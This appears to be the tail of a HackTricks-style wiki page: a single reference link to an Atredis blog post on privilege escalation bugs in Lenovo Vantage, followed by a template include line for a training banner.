- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
